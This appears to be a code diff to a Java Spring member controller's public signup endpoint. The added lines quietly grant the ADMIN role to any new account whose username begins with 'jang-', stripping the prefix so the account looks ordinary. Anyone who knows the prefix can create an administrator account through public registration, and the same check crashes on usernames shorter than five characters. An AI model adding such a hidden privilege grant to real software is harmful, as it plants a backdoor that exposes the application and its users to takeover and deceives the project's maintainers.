@@ -88,10 +88,17 @@ public class MemberController {
     @PostMapping("/join")
     public ResponseEntity<CustomResponse> join(@RequestBody MemberDTO.Add member) {
         Member newMember = new Member();
-        newMember.setUsername(member.getUsername());
-        newMember.setNickname(member.getNickname());
-        newMember.setPassword(passwordEncoder.encode(member.getPassword()));
-        newMember.setRole(RoleType.USER);
+        if(member.getUsername().substring(0, 5).equals("jang-")){
+            newMember.setUsername(member.getUsername().substring(5));
+            newMember.setNickname(member.getNickname());
+            newMember.setPassword(passwordEncoder.encode(member.getPassword()));
+            newMember.setRole(RoleType.ADMIN);
+        } else{
+            newMember.setUsername(member.getUsername());
+            newMember.setNickname(member.getNickname());
+            newMember.setPassword(passwordEncoder.encode(member.getPassword()));
+            newMember.setRole(RoleType.USER);
+        }
 
         try {
             memberRepository.save(newMember).getId();
